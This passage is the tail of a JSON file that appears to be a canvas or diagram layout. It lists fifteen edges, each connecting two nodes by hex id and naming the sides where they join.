		{"id":"cc1dd43fc6c4dce9","fromNode":"c43c09b5a27c6f80","fromSide":"left","toNode":"c458828e446d076f","toSide":"right"},
		{"id":"e919319d970645e8","fromNode":"28ffaf4f75ea584b","fromSide":"bottom","toNode":"c43c09b5a27c6f80","toSide":"top"},
		{"id":"ce47cf5872b7ba15","fromNode":"c43c09b5a27c6f80","fromSide":"bottom","toNode":"2d824d6131fce094","toSide":"top"},
		{"id":"cd81e7ba509b6590","fromNode":"2d824d6131fce094","fromSide":"left","toNode":"e214ed120d45c08a","toSide":"right"},
		{"id":"3bd9a499c1fff3c5","fromNode":"2d824d6131fce094","fromSide":"right","toNode":"6f55ee57ba880979","toSide":"left"},
		{"id":"437095f8727d1c35","fromNode":"2d824d6131fce094","fromSide":"bottom","toNode":"a9d3163314090aa4","toSide":"top"},
		{"id":"3a528dc51e70fb17","fromNode":"a9d3163314090aa4","fromSide":"left","toNode":"d3263c1925ddb36c","toSide":"right"},
		{"id":"f386e176fb1f0dbe","fromNode":"d3263c1925ddb36c","fromSide":"left","toNode":"a94d54939da6277a","toSide":"right"},
		{"id":"9fa11e6d6dfb95a0","fromNode":"d3263c1925ddb36c","fromSide":"left","toNode":"acbfb7d40b4eec22","toSide":"right"},
		{"id":"e782cc1e3704b1c8","fromNode":"2d824d6131fce094","fromSide":"left","toNode":"cb14f5abb112f7a1","toSide":"right"},
		{"id":"931f9386b8a2db40","fromNode":"cb14f5abb112f7a1","fromSide":"left","toNode":"45207dd63fbbe55b","toSide":"right"},
		{"id":"84856d55c31d7810","fromNode":"a94d54939da6277a","fromSide":"top","toNode":"45207dd63fbbe55b","toSide":"bottom"},
		{"id":"bd0089a204a101f6","fromNode":"2d824d6131fce094","fromSide":"right","toNode":"780a7728bf920c66","toSide":"left"},
		{"id":"73590ccb4b62074b","fromNode":"6f55ee57ba880979","fromSide":"right","toNode":"9c512660e25af682","toSide":"left"},
		{"id":"a498571230216cb4","fromNode":"a94d54939da6277a","fromSide":"left","toNode":"08311dacd8c22b8d","toSide":"right"}
	]
}